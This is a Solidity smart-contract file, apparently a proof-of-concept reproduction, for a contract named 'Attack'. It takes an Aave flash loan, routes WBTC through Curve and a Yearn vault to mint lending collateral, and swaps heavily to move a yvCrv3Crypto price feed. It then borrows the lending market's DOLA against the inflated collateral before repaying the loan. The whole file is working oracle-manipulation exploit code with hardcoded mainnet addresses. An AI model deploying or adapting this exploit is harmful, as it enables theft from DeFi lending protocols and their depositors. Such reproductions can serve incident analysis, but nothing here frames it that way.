// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/AttackBase.sol";
import "./interfaces/ICurveFi.sol";
import "./interfaces/ICurveRegistryExchange.sol";
import "./aave/FlashLoanReceiverBase.sol";
import "./aave/ILendingPool.sol";
import "hardhat/console.sol";
import "./interfaces/IYearnVault.sol";
import "./interfaces/ICErc20ImmutableYearn.sol";
import "./interfaces/IUnitroller.sol";
import "./interfaces/IYVCrv3CryptoFeed.sol";

contract Attack is FlashLoanReceiverBase, AttackBase {
    using SafeMath for uint256;

    constructor(ILendingPoolAddressesProvider provider)
        FlashLoanReceiverBase(provider)
    {}

    function start(AttackParams memory _params) external {
        bytes memory data = abi.encode(
            FlashCallbackData({
                me: msg.sender,
                curvePool: _params.curvePool,
                depositAmount: _params.depositAmount,
                crv3crypto: _params.crv3crypto,
                yearnVault: _params.yearnVault,
                YVCrv3CryptoFeed: _params.YVCrv3CryptoFeed,
                USDT: _params.USDT,
                Crv: _params.Crv,
                Dola: _params.Dola
            })
        );
        ILendingPool(address(LENDING_POOL)).flashLoan(
            address(this),
            _params.assets,
            _params.amounts,
            _params.modes,
            address(this),
            data,
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, // initiator
        bytes memory params
    ) public override returns (bool) {
        FlashCallbackData memory decoded = abi.decode(
            params,
            (FlashCallbackData)
        );
        address asset = assets[0];
        //check the contract has the specified balance
        require(
            amounts[0] <= IERC20(asset).balanceOf(address(this)),
            "Invalid balance"
        );

        // asset = wbtc
        setup(decoded, asset, amounts[0]);

        lastestAnswer(decoded.YVCrv3CryptoFeed);

        exchange(
            asset,
            decoded.USDT,
            IERC20(asset).balanceOf(address(this)),
            decoded.curvePool
        );
        // console.log("exchanged: WBTC to USDT");

        lastestAnswer(decoded.YVCrv3CryptoFeed);
        borrowDola(decoded.Dola);

        exchange(
            decoded.USDT,
            asset,
            IERC20(decoded.USDT).balanceOf(address(this)),
            decoded.curvePool
        );
        // console.log("exchanged: USDT to WBTC");

        exchange(
            decoded.Dola,
            decoded.Crv,
            IERC20(decoded.Dola).balanceOf(address(this)),
            0xAA5A67c256e27A5d80712c51971408db3370927D
        );
        // console.log("exchanged: DOLA to CRV");

        removeLiquidityCurve(decoded.Crv);
        exchange(decoded.USDT, asset, 10_000_000_000_000, decoded.curvePool);

        uint256 amountToReturn = amounts[0].add(premiums[0]);
        require(IERC20(asset).balanceOf(address(this)) >= amountToReturn, "n");

        IERC20(asset).approve(address(LENDING_POOL), amountToReturn);
        return true;
    }

    function setup(
        FlashCallbackData memory _decoded,
        address wbtc,
        uint256 amount
    ) internal {
        addLiquidityCurve(
            _decoded.curvePool,
            wbtc,
            amount,
            _decoded.depositAmount
        );
        uint256 yearnVaultBalance = depositToYearnVault(
            _decoded.crv3crypto,
            _decoded.yearnVault
        );

        address anYvCrvCrypto = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587;
        mintCrv(_decoded.yearnVault, yearnVaultBalance, anYvCrvCrypto);
        enterMarkets(anYvCrvCrypto);
    }

    function addLiquidityCurve(
        address curvePool,
        address token,
        uint256 amount,
        uint256 depositAmount
    ) internal {
        IERC20(token).approve(curvePool, amount);
        uint256[3] memory curveAmounts1 = [0, depositAmount, 0];
        ICurveFi(curvePool).add_liquidity(curveAmounts1, 0);
    }

    function borrowDola(address _dola) internal {
        address inverseDola = 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670;
        ICErc20ImmutableYearn(inverseDola).borrow(
            IERC20(_dola).balanceOf(inverseDola)
        );
    }

    function removeLiquidityCurve(address _Crv) internal {
        uint256 amount = IERC20(_Crv).balanceOf(address(this));
        address curvePool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
        IERC20(_Crv).approve(curvePool, amount);
        ICurveFi(curvePool).remove_liquidity_one_coin(amount, 2, 0);
    }

    function depositToYearnVault(address crv3crypto, address yearnVault)
        internal
        returns (uint256 yearnVaultBalance)
    {
        uint256 crv3cryptoBalance = IERC20(crv3crypto).balanceOf(address(this));
        IERC20(crv3crypto).approve(yearnVault, crv3cryptoBalance);
        IYearnVault(yearnVault).deposit(crv3cryptoBalance, address(this));
        yearnVaultBalance = IERC20(yearnVault).balanceOf(address(this));
    }

    function mintCrv(
        address yearnVault,
        uint256 yearnVaultBalance,
        address anYvCrvCrypto
    ) internal {
        IERC20(yearnVault).approve(anYvCrvCrypto, yearnVaultBalance);
        ICErc20ImmutableYearn(anYvCrvCrypto).mint(yearnVaultBalance);
    }

    function enterMarkets(address anYvCrvCrypto) internal {
        address unitroller = 0x4dCf7407AE5C07f8681e1659f626E114A7667339;
        address[] memory cTokens = new address[](1);
        cTokens[0] = anYvCrvCrypto;
        IUnitroller(unitroller).enterMarkets(cTokens);
    }

    function lastestAnswer(address YVCrv3CryptoFeed)
        internal
        view
        returns (uint256 answer)
    {
        answer = IYVCrv3CryptoFeed(YVCrv3CryptoFeed).latestAnswer();
        console.log("latest answer", answer);
    }

    function exchange(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address pool
    ) internal {
        address curveExchangePool = 0x8e764bE4288B842791989DB5b8ec067279829809;
        IERC20(tokenIn).approve(curveExchangePool, amountIn);
        ICurveRegistryExchange(curveExchangePool).exchange(
            pool,
            tokenIn,
            tokenOut,
            amountIn,
            0,
            address(this)
        );
    }
}
